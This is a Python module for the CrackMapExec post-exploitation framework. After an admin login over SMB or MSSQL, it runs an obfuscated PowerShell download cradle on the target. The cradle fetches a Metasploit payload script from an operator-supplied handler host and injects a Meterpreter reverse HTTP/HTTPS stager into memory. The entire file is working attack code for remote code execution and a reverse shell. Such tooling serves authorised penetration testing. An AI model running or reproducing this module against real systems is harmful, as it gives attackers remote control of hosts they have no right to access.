from cme.helpers.powershell import *
from sys import exit

class CMEModule:
    '''
        Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
        Module by @byt3bl33d3r
    '''
    name = 'met_inject'
    description = "Downloads the Meterpreter stager and injects it into memory"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            LHOST    IP hosting the handler
            LPORT    Handler port
            RAND     Random string given by metasploit
            PAYLOAD  Payload to inject: reverse_http or reverse_https (default: reverse_https)
        '''

        self.met_payload = 'reverse_https'
        self.procid = None

        if not 'LHOST' in module_options or not 'LPORT' in module_options or not 'RAND' in module_options:
            context.log.error('LHOST and LPORT  and RAND options are required!')
            exit(1)

        if 'PAYLOAD' in module_options:
            self.met_payload = module_options['PAYLOAD']

        self.lhost = module_options['LHOST']
        self.lport = module_options['LPORT']
        self.rand = module_options['RAND']

        self.ps_script = obfs_ps_script('Invoke-MetasploitPayload/Invoke-MetasploitPayload.ps1')

    def on_admin_login(self, context, connection):
        payload = """Invoke-MetasploitPayload {}://{}:{}/{}""".format('http' if self.met_payload == 'reverse_http' else 'https',
                                                            self.lhost,
                                                            self.lport,
                                                            self.rand)
        launcher = gen_ps_iex_cradle(context, 'Invoke-MetasploitPayload.ps1', payload, post_back=False)
        connection.ps_execute(launcher, force_ps32=True)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-MetasploitPayload.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            request.wfile.write(self.ps_script.encode())
            request.stop_tracking_host()
        else:
            request.send_response(404)
            request.end_headers()